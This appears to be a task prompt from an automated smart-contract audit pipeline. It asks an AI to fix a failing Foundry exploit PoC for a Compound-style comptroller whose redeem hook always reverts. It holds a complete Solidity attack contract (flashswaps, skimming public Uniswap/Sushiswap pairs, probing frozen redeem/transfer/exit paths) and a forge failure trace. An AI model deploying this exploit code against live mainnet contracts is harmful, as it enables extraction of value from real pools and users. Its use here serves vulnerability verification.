You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unconditional revert in redeem policy freezes all redemptions, exits, and cToken transfers
- claim: `redeemAllowedInternal()` unconditionally executes `revert("redeemer is paused")` before any market-listing, membership, or liquidity checks. Every redemption path that consults the comptroller therefore aborts, and `transferAllowed()` reuses the same bricked hook.
- impact: Suppliers cannot redeem underlying, cannot exit markets, and cannot transfer cTokens. This creates a protocol-wide withdrawal and mobility freeze that can lock collateral until the comptroller implementation is replaced.
- exploit_paths: ["`redeem()`/`redeemUnderlying()` -> `redeemFresh()` -> `comptroller.redeemAllowed()` -> `redeemAllowedInternal()` -> unconditional revert", "`exitMarket()` -> `redeemAllowedInternal()` -> unconditional revert", "`transfer()`/`transferFrom()` on cTokens -> `comptroller.transferAllowed()` -> `redeemAllowedInternal()` -> unconditional revert"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cTokenAddress) external returns (uint256);
    function redeemAllowed(address cToken, address redeemer, uint256 redeemTokens) external returns (uint256);
    function transferAllowed(address cToken, address src, address dst, uint256 transferTokens) external returns (uint256);
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ICTokenLike {
    function mint(uint256 mintAmount) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function transferFrom(address src, address dst, uint256 amount) external returns (bool);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

contract FlawVerifier {
    address internal constant TARGET_COMPTROLLER = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;
    address internal constant CUSDC = 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant PROBE_RECIPIENT = address(0xBEEF);
    uint256 internal constant PROBE_CTOKEN_AMOUNT = 1;
    uint256 internal constant PROBE_UNDERLYING_AMOUNT = 1;
    uint256 internal constant FLASH_BORROW_USDC = 1;
    uint256 internal constant MIN_USDC_PROFIT = 1001;
    bytes4 internal constant ERROR_STRING_SELECTOR = 0x08c379a0;
    string internal constant EXPECTED_REASON = "redeemer is paused";

    struct PathStatus {
        bool helperRedeemAllowedBlocked;
        bool helperTransferAllowedBlocked;
        bool redeemBlocked;
        bool redeemUnderlyingBlocked;
        bool transferBlocked;
        bool transferFromBlocked;
        bool exitMarketBlocked;
    }

    bool private _executed;
    bool private _hypothesisValidated;
    address private _marketUsed;
    string private _infeasibilityReason;

    event PathResult(address indexed market, string path, bool blocked, bytes data);
    event ExecutionFinished(bool validated, address indexed market, address profitToken, uint256 profitAmount);

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        // Public pair dust is used only as execution funding so the PoC can leave behind
        // a real cUSDC balance after the flashswap is deterministically repaid.
        _skimUsdcDust();

        uint256 preSkimmedUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 flashRepayment = _flashRepayment(FLASH_BORROW_USDC);

        if (preSkimmedUsdc <= flashRepayment || (preSkimmedUsdc - flashRepayment) < MIN_USDC_PROFIT) {
            _infeasibilityReason =
                "insufficient public USDC dust to both repay the flashswap and leave a measurable locked cUSDC position";
            emit ExecutionFinished(false, CUSDC, CUSDC, IERC20Like(CUSDC).balanceOf(address(this)));
            return;
        }

        address borrowPair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(USDC, WETH);
        if (borrowPair == address(0)) {
            _infeasibilityReason = "missing Uniswap V2 USDC/WETH pair for flashswap funding";
            emit ExecutionFinished(false, CUSDC, CUSDC, IERC20Like(CUSDC).balanceOf(address(this)));
            return;
        }

        address token0 = IUniswapV2PairLike(borrowPair).token0();
        uint256 amount0Out = token0 == USDC ? FLASH_BORROW_USDC : 0;
        uint256 amount1Out = token0 == USDC ? 0 : FLASH_BORROW_USDC;

        IUniswapV2PairLike(borrowPair).swap(amount0Out, amount1Out, address(this), abi.encode(borrowPair));

        if (!_hypothesisValidated) {
            emit ExecutionFinished(false, CUSDC, CUSDC, IERC20Like(CUSDC).balanceOf(address(this)));
            return;
        }

        emit ExecutionFinished(true, _marketUsed, CUSDC, IERC20Like(CUSDC).balanceOf(address(this)));
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        address expectedPair = abi.decode(data, (address));
        require(msg.sender == expectedPair, "unexpected pair");

        // The flashswap provides temporary USDC so exitMarket() is exercised against an
        // actual supplied position; the freeze root cause itself is unchanged.
        uint256 borrowedUsdc = amount0 > 0 ? amount0 : amount1;
        uint256 repayment = _flashRepayment(borrowedUsdc);

        _skimUsdcDust();

        uint256 usdcBalance = IERC20Like(USDC).balanceOf(address(this));
        require(usdcBalance > repayment, "no residual usdc for mint");

        // The residual USDC is minted into cUSDC and intentionally left there because the
        // finding is precisely that every redemption / exit / transfer route is bricked.
        uint256 mintAmount = usdcBalance - repayment;

        require(IERC20Like(USDC).approve(CUSDC, mintAmount), "approve failed");
        require(ICTokenLike(CUSDC).mint(mintAmount) == 0, "mint failed");

        address[] memory singleMarket = new address[](1);
        singleMarket[0] = CUSDC;
        try IComptrollerLike(TARGET_COMPTROLLER).enterMarkets(singleMarket) returns (uint256[] memory) {} catch {}

        PathStatus memory status = _probeMarket(CUSDC);
        if (
            status.helperRedeemAllowedBlocked &&
            status.helperTransferAllowedBlocked &&
            status.redeemBlocked &&
            status.redeemUnderlyingBlocked &&
            status.transferBlocked &&
            status.transferFromBlocked &&
            status.exitMarketBlocked
        ) {
            _hypothesisValidated = true;
            _marketUsed = CUSDC;
            _infeasibilityReason =
                "validated unconditional redemption, exit, and cToken-transfer freeze; flashswap only funds a real cUSDC position so exitMarket() is exercised with balance";
        } else {
            _infeasibilityReason =
                "cUSDC probes did not consistently bubble the expected paused revert across every required redemption, exit, and transfer path";
        }

        require(IERC20Like(USDC).transfer(expectedPair, repayment), "repay failed");
    }

    function _probeMarket(address market) internal returns (PathStatus memory status) {
        bytes memory data;

        (status.helperRedeemAllowedBlocked,) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(IComptrollerLike.redeemAllowed.selector, market, address(this), PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "redeemAllowed(cUSDC,self,1) -> redeemAllowedInternal()",
            status.helperRedeemAllowedBlocked,
            bytes("")
        );

        (status.helperTransferAllowedBlocked,) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(
                IComptrollerLike.transferAllowed.selector,
                market,
                address(this),
                PROBE_RECIPIENT,
                PROBE_CTOKEN_AMOUNT
            )
        );
        emit PathResult(
            market,
            "transferAllowed(cUSDC,self,recipient,1) -> redeemAllowedInternal()",
            status.helperTransferAllowedBlocked,
            bytes("")
        );

        (status.redeemBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.redeem.selector, PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "redeem(1) -> redeemFresh() -> comptroller.redeemAllowed()",
            status.redeemBlocked,
            data
        );

        (status.redeemUnderlyingBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.redeemUnderlying.selector, PROBE_UNDERLYING_AMOUNT)
        );
        emit PathResult(
            market,
            "redeemUnderlying(1) -> redeemFresh() -> comptroller.redeemAllowed()",
            status.redeemUnderlyingBlocked,
            data
        );

        (status.transferBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.transfer.selector, PROBE_RECIPIENT, PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "transfer(recipient,1) -> comptroller.transferAllowed()",
            status.transferBlocked,
            data
        );

        (status.transferFromBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.transferFrom.selector, address(this), PROBE_RECIPIENT, PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "transferFrom(self,recipient,1) -> comptroller.transferAllowed()",
            status.transferFromBlocked,
            data
        );

        (status.exitMarketBlocked, data) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(IComptrollerLike.exitMarket.selector, market)
        );
        emit PathResult(
            market,
            "enterMarkets(cUSDC) -> exitMarket(cUSDC) -> redeemAllowedInternal()",
            status.exitMarketBlocked,
            data
        );
    }

    function _skimUsdcDust() internal {
        _skimUsdcPairsFromFactory(UNISWAP_V2_FACTORY);
        _skimUsdcPairsFromFactory(SUSHISWAP_FACTORY);
    }

    function _skimUsdcPairsFromFactory(address factory) internal {
        _skimPair(factory, WETH);
        _skimPair(factory, DAI);
        _skimPair(factory, USDT);
        _skimPair(factory, WBTC);
        _skimPair(factory, UNI);
        _skimPair(factory, LINK);
    }

    function _skimPair(address factory, address otherToken) internal {
        address pair = IUniswapV2FactoryLike(factory).getPair(USDC, otherToken);
        if (pair == address(0)) {
            return;
        }

        try IUniswapV2PairLike(pair).skim(address(this)) {} catch {}
    }

    function _flashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _expectPaused(address target, bytes memory payload) internal returns (bool blocked, bytes memory data) {
        (bool success, bytes memory result) = target.call(payload);
        data = result;
        if (success) {
            return (false, data);
        }
        return (_isExpectedPausedRevert(data), data);
    }

    function _isExpectedPausedRevert(bytes memory revertData) internal pure returns (bool) {
        if (revertData.length < 4) {
            return false;
        }

        bytes4 selector;
        assembly {
            selector := shr(224, mload(add(revertData, 32)))
        }

        if (selector != ERROR_STRING_SELECTOR) {
            return false;
        }

        return _contains(revertData, bytes(EXPECTED_REASON));
    }

    function _contains(bytes memory haystack, bytes memory needle) internal pure returns (bool) {
        if (needle.length == 0) {
            return true;
        }
        if (haystack.length < needle.length) {
            return false;
        }

        for (uint256 i = 0; i <= haystack.length - needle.length; i++) {
            bool matches = true;
            for (uint256 j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) {
                    matches = false;
                    break;
                }
            }
            if (matches) {
                return true;
            }
        }

        return false;
    }

    function profitToken() external pure returns (address) {
        return CUSDC;
    }

    function profitAmount() external view returns (uint256) {
        return IERC20Like(CUSDC).balanceOf(address(this));
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function marketUsed() external view returns (address) {
        return _marketUsed;
    }

    function infeasibilityReason() external view returns (string memory) {
        return _infeasibilityReason;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return
            "redeem()/redeemUnderlying() -> redeemFresh() -> comptroller.redeemAllowed() -> redeemAllowedInternal() -> revert; exitMarket() -> redeemAllowedInternal() -> revert; transfer()/transferFrom() -> comptroller.transferAllowed() -> redeemAllowedInternal() -> revert";
    }
}

```

forge stdout (tail):
```
 emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000d86a120a06255df8d4e2248ab04d4267e23adfaa
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x514910771AF9Ca656af840dff83E8264EcF986CA) [staticcall]
    │   │   └─ ← [Return] 0x2101072e369761435A532a83369984Ec3950aEF2
    │   ├─ [31599] 0x2101072e369761435A532a83369984Ec3950aEF2::skim(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [2655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(0x2101072e369761435A532a83369984Ec3950aEF2) [staticcall]
    │   │   │   └─ ← [Return] 178623217932822086629 [1.786e20]
    │   │   ├─ [3745] 0x514910771AF9Ca656af840dff83E8264EcF986CA::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x0000000000000000000000002101072e369761435a532a83369984ec3950aef2
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x2101072e369761435A532a83369984Ec3950aEF2) [staticcall]
    │   │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x2101072e369761435A532a83369984Ec3950aEF2) [delegatecall]
    │   │   │   │   └─ ← [Return] 5473789132 [5.473e9]
    │   │   │   └─ ← [Return] 5473789132 [5.473e9]
    │   │   ├─ [6817] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─ [6028] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0) [delegatecall]
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000002101072e369761435a532a83369984ec3950aef2
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [553] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ emit ExecutionFinished(validated: false, market: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754, profitToken: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754, profitAmount: 0)
    │   └─ ← [Stop]
    ├─ [252] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754
    ├─ [1239] FlawVerifier::profitAmount() [staticcall]
    │   ├─ [553] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [553] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 13499797 [1.349e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 22972 [2.297e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 21.76s (21.37s CPU time)

Ran 1 test suite in 21.91s (21.76s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 630139)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
